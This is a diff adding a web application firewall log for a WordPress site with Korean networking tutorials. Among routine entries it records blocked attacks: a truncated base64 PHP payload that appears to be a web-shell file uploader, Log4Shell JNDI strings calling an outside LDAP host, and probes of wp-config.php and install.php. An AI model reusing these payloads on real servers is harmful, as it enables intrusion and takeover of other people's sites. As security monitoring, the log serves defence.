@@ -1,0 +1,799 @@
+       DATE         INCIDENT  LEVEL     RULE     IP            REQUEST 
+
+01/Dec/25 11:25:28  #6679159  INFO         -  61.83.227.119    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+01/Dec/25 11:25:30  #7832552  INFO         -  61.83.227.119    POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+02/Dec/25 05:09:36  #1918675  INFO         -  104.135.192.131  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%8B%9C%EB%AE%AC%EB%A0%88%EC%9D%B4%EC%85%98/] - coffeecrawlers.com 
+
+02/Dec/25 15:59:31  #8607879  INFO         -  5.254.112.116    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 
+
+02/Dec/25 15:59:33  #6048471  INFO         -  5.254.112.116    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+02/Dec/25 15:59:35  #6493591  INFO         -  5.254.112.116    POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+02/Dec/25 15:59:37  #3396669  INFO         -  5.254.112.116    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/#comment-191] - coffeecrawlers.com 
+
+02/Dec/25 16:50:48  #4479217  HIGH      1366  4.218.11.1       GET /wp-admin/install.php - Unauthorized file access - [SERVER:SCRIPT_NAME = /wp-admin/install.php] - coffeecrawlers.com 
+
+03/Dec/25 17:28:51  #1611218  CRITICAL     -  195.24.236.120   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+03/Dec/25 17:28:53  #1463250  CRITICAL     -  195.24.236.120   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+06/Dec/25 07:50:50  #1293939  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+06/Dec/25 07:50:52  #5669024  INFO         -  121.139.68.4     POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+06/Dec/25 10:25:41  #1290521  INFO         -  61.83.227.119    POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+06/Dec/25 13:57:37  #5880653  HIGH       310  195.178.110.201  GET /wp-config.php - Access to a configuration file - [SERVER:SCRIPT_NAME = /wp-config.php] - www.coffeecrawlers.com 
+
+07/Dec/25 02:59:37  #6883349  INFO         -  216.73.216.153   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%EC%9D%98-%EB%AC%BC%EB%A6%AC%EC%A0%81-%EC%97%B0%EA%B2%B0-%EB%B0%8F-%EB%9D%BC%EC%9A%B0%ED%84%B0-%EA%B8%B0%EB%B3%B8-%EC%84%A4%EC%A0%95] - coffeecrawlers.com 
+
+07/Dec/25 07:09:39  #5481653  INFO         -  149.34.252.11    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 
+
+07/Dec/25 07:09:41  #2426698  INFO         -  149.34.252.11    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+07/Dec/25 07:09:43  #7154088  INFO         -  149.34.252.11    POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+07/Dec/25 07:09:46  #7459221  INFO         -  149.34.252.11    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/#comment-215] - coffeecrawlers.com 
+
+07/Dec/25 08:13:08  #4378263  INFO         -  216.73.216.153   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%EB%9D%BC%EC%9A%B0%ED%84%B0-%EC%84%B8%EB%B6%80-%EC%84%A4%EC%A0%95] - coffeecrawlers.com 
+
+07/Dec/25 08:15:58  #8997210  MEDIUM     312  216.106.189.40   GET /index.php - Non-compliant IP - [SERVER:HTTP_X_FORWARDED_FOR = ${jndi:ldap://238500-xff.216.106.189.88/a}] - coffeecrawlers.com 
+
+07/Dec/25 16:06:44  #3291520  INFO         -  216.73.216.153   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/category/network/%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%84%a4%ea%b3%84-%eb%b0%8f-%ed%85%8c%ec%8a%a4%ed%8a%b8/feed] - coffeecrawlers.com 
+
+07/Dec/25 16:10:00  #4795527  INFO         -  216.73.216.153   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/category/network/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%84%A4%EA%B3%84-%EB%B0%8F-%ED%85%8C%EC%8A%A4%ED%8A%B8] - coffeecrawlers.com 
+
+07/Dec/25 16:26:53  #4075254  MEDIUM     531  34.147.91.161    GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Scrapy/2.13.3 (+https://scrapy.org)] - www.coffeecrawlers.com 
+
+07/Dec/25 17:55:11  #2375789  INFO         -  216.73.216.153   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%8b%9c%eb%ae%ac%eb%a0%88%ec%9d%b4%ec%85%98/feed] - coffeecrawlers.com 
+
+07/Dec/25 17:57:07  #7899686  INFO         -  216.73.216.153   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%8B%9C%EB%AE%AC%EB%A0%88%EC%9D%B4%EC%85%98] - coffeecrawlers.com 
+
+08/Dec/25 06:18:46  #4286663  MEDIUM     312  216.106.189.40   GET /index.php - Non-compliant IP - [SERVER:HTTP_X_FORWARDED_FOR = ${jndi:ldap://568243-xff.216.106.189.88/a}] - www.coffeecrawlers.com 
+
+09/Dec/25 01:29:18  #7598632  MEDIUM     306  195.178.110.223  GET /index.php - Bogus user-agent signature - [SERVER:HTTP_USER_AGENT = SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]] - coffeecrawlers.com 
+
+09/Dec/25 16:10:42  #2790401  INFO         -  47.76.248.58     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-3-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%ec%88%a0%ec%9d%98-%eb%b0%9c%ec%a0%84/] - coffeecrawlers.com 
+
+09/Dec/25 16:42:07  #3336866  INFO         -  101.44.187.212   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0/] - coffeecrawlers.com 
+
+09/Dec/25 17:05:27  #2299803  INFO         -  8.217.16.82      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-1-%ec%9d%b8%ed%84%b0%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%82%b9-%eb%b0%8f-%ec%9d%b8%ed%84%b0%eb%84%b7/] - coffeecrawlers.com 
+
+09/Dec/25 17:18:36  #4145414  INFO         -  8.218.177.187    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%8b%9c%eb%ae%ac%eb%a0%88%ec%9d%b4%ec%85%98/] - coffeecrawlers.com 
+
+09/Dec/25 17:23:21  #8888534  INFO         -  47.238.226.232   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+09/Dec/25 17:32:02  #1790122  INFO         -  8.217.96.42      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+09/Dec/25 17:33:14  #1401602  INFO         -  47.238.253.123   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-%eb%a7%9d-%ea%b5%ac%ec%a1%b0%ec%99%80-%ed%97%88%eb%b8%8c-%eb%b0%8f-%ec%8a%a4%ec%9c%84%ec%b9%98/] - coffeecrawlers.com 
+
+09/Dec/25 19:13:38  #5523391  MEDIUM     531  3.249.99.15      GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - coffeecrawlers.com 
+
+09/Dec/25 19:35:53  #2682188  MEDIUM     531  3.249.68.134     GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - www.coffeecrawlers.com 
+
+09/Dec/25 23:17:33  #1686298  INFO         -  162.128.159.36   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%ec%9d%98-%eb%ac%bc%eb%a6%ac%ec%a0%81-%ec%97%b0%ea%b2%b0-%eb%b0%8f-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%eb%b3%b8-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+09/Dec/25 23:18:33  #7686508  INFO         -  47.76.109.247    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/] - coffeecrawlers.com 
+
+09/Dec/25 23:20:04  #8903816  INFO         -  101.44.25.58     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-4-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+10/Dec/25 15:56:11  #1749665  CRITICAL     -  195.24.236.120   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+10/Dec/25 15:56:16  #1587489  CRITICAL     -  195.24.236.120   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+10/Dec/25 21:35:42  #6147386  INFO         -  173.244.207.104  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 
+
+10/Dec/25 21:35:44  #8174070  INFO         -  173.244.207.104  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+10/Dec/25 21:35:46  #8589420  INFO         -  173.244.207.104  POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+10/Dec/25 21:35:48  #6705481  INFO         -  173.244.207.104  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/#comment-226] - coffeecrawlers.com 
+
+10/Dec/25 23:53:31  #4221245  INFO         -  61.108.4.18      POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+11/Dec/25 08:00:09  #2293787  MEDIUM     531  54.216.49.15     GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - www.coffeecrawlers.com 
+
+11/Dec/25 08:38:38  #7469710  MEDIUM     531  108.130.218.179  GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - coffeecrawlers.com 
+
+11/Dec/25 14:13:11  #3182118  CRITICAL     -  4.190.216.136    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+11/Dec/25 14:13:13  #4602835  CRITICAL     -  4.190.216.136    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+11/Dec/25 19:55:56  #2793881  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/#respond] - coffeecrawlers.com 
+
+11/Dec/25 19:56:11  #5967958  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+11/Dec/25 19:56:15  #6765631  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+11/Dec/25 19:56:20  #5461238  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/] - coffeecrawlers.com 
+
+11/Dec/25 19:56:26  #5654061  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/#respond] - coffeecrawlers.com 
+
+11/Dec/25 19:56:30  #5200219  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/#respond] - coffeecrawlers.com 
+
+11/Dec/25 19:56:35  #7200452  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+11/Dec/25 19:56:39  #1987901  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#respond] - coffeecrawlers.com 
+
+11/Dec/25 19:56:43  #5873473  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/#respond] - coffeecrawlers.com 
+
+11/Dec/25 19:56:49  #4225708  INFO         -  188.143.244.155  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+12/Dec/25 17:03:29  #7450200  INFO         -  124.156.107.241  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-1-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%9d%bc%eb%b0%98/] - coffeecrawlers.com 
+
+12/Dec/25 17:06:33  #8552671  CRITICAL     -  4.197.163.184    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+12/Dec/25 17:06:34  #5701274  CRITICAL     -  4.197.163.184    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+12/Dec/25 17:10:29  #3913161  INFO         -  150.109.34.246   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-3-%ed%94%84%eb%a1%9c%ed%86%a0%ec%bd%9cprotocol/] - coffeecrawlers.com 
+
+12/Dec/25 17:12:58  #3252221  INFO         -  43.128.46.24     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/1-2-%ec%bb%b4%ed%93%a8%ed%84%b0-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac%ec%9d%98-%ea%b5%ac%eb%b6%84/] - coffeecrawlers.com 
+
+12/Dec/25 17:32:42  #6003934  INFO         -  119.8.237.148    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%9d%b4%ed%95%b4/] - coffeecrawlers.com 
+
+14/Dec/25 03:15:36  #7958693  INFO         -  173.244.207.104  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 
+
+14/Dec/25 03:15:39  #8115998  INFO         -  173.244.207.104  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+14/Dec/25 03:15:42  #7944345  INFO         -  173.244.207.104  POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+14/Dec/25 03:15:44  #4499050  INFO         -  173.244.207.104  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/#comment-231] - coffeecrawlers.com 
+
+14/Dec/25 16:24:00  #1848142  INFO         -  47.76.52.82      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/category/%ed%94%84%eb%a1%9c%ea%b7%b8%eb%9e%98%eb%b0%8d-%ec%96%b8%ec%96%b4/] - coffeecrawlers.com 
+
+15/Dec/25 16:03:27  #6657454  INFO         -  47.238.6.156     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/python3-venv-%eb%a1%9c-%ea%b0%80%ec%83%81%ed%99%94%ed%95%98%ea%b8%b0/] - coffeecrawlers.com 
+
+16/Dec/25 19:04:36  #7147188  CRITICAL     -  20.250.45.203    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+16/Dec/25 19:04:38  #5655124  CRITICAL     -  20.250.45.203    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+16/Dec/25 22:14:12  #5080925  INFO         -  89.234.157.254   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0] - coffeecrawlers.com 
+
+16/Dec/25 22:14:13  #7977141  INFO         -  89.234.157.254   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0] - coffeecrawlers.com 
+
+16/Dec/25 22:14:24  #8623125  INFO         -  176.65.134.8     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5] - coffeecrawlers.com 
+
+16/Dec/25 22:14:25  #6696590  INFO         -  176.65.134.8     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5] - coffeecrawlers.com 
+
+02/Nov/25 12:42:19  #6664764  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+02/Nov/25 12:42:34  #4940390  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/#respond] - coffeecrawlers.com 
+
+02/Nov/25 12:42:38  #1984490  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/#respond] - coffeecrawlers.com 
+
+02/Nov/25 12:42:43  #8088468  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+02/Nov/25 12:42:47  #1133858  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#respond] - coffeecrawlers.com 
+
+02/Nov/25 12:42:57  #7492403  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/#respond] - coffeecrawlers.com 
+
+02/Nov/25 12:43:13  #1968392  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/#respond] - coffeecrawlers.com 
+
+02/Nov/25 12:43:19  #8559729  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/] - coffeecrawlers.com 
+
+02/Nov/25 12:43:36  #4702640  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
